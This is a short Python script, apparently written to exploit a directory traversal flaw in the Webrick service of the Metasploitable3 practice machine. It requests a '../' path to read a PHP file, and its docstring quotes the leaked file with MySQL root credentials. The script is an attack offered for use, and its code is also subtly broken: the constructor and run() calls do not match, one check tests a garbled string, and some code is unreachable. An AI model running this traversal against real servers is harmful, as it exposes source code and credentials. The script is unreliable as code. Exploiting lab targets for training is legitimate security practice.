#!/usr/bin/env python3

import requests
import argparse

import logging

log = logging.getLogger(__name__)

""" Dir Traversal http://10.0.28.14:3500/readme?os=../../../../../var/www/html/payroll_app.php
<?php

$conn = new mysqli('127.0.0.1', 'root', 'sploitme', 'payroll');
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}
?>
"""


class Webrick:
    def __init__(self):
        self.__host = None
        self.__port = 3500
        self.__path = "/readme?os=../../../../../var/www/html/payroll_app.php"

    def __check(self):
        r = requests.get(f"http://{self.__host}:{self.__port}/readme")
        if r.status_code != 200:
            log.info(f"[!] Webrick is down ({self.__host})")
            return False
        if "Welcome to Metasploitable3" in r.text:
            return True
        log.info(f"[!] Unknown problem with Webrick ({self.__host})")
        return False

    def __exploit(self):
        log.debug(f"[!] Start Webrick exploit ({self.__host})")
        r = requests.get(f"http://{self.__host}:{self.__port}{self.__path}")
        if "<?php" in r.text or "my mysqli(" in r.text:
            log.info(f"[!] Webrick is vulnerable ({self.__host})")
            return True
        if "Template is missing" in r.text:
            log.info(f"[!] Webrick is vulnerable ({self.__host})")
            return True
        if "Windows Metasploitable3" in r.text:
            log.info(f"[!] Webrick is secure ({self.__host})")
            return False
        if "Linux Metasploitable3" in r.text:
            log.info(f"[!] Webrick is secure ({self.__host})")
            return False
        if "To learn more about each version, please click one of the images below" in r.text:
            log.info(f"[!] Webrick is secure ({self.__host})")
            return False
        log.info(f"[!] Bad data from on base page ({self.__host})")
        return True

        log.info(f"[!] Webrick is secure ({self.__host})")
        return False

    def run(self, host, port=None):
        self.__host = host
        log.debug(f"[+] Exploiting Webrick ({self.__host})")
        if not self.__check():
            return True
        if port:
            self.__port = port
        return self.__exploit()


def main(args):
    log.info("[+] Metasploitable Webrick Dir Traversal by xentrick")
    log.info("[+] Exploiting " + args.host + ":" + args.port)

    exploit = Webrick(args.host, int(args.port))
    if exploit.run():
        log.info("Target exploited")
    else:
        log.info("Exploit failed.")


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--host", required=True)
    parser.add_argument("--port", required=True)
    args = parser.parse_args()

    main(args)
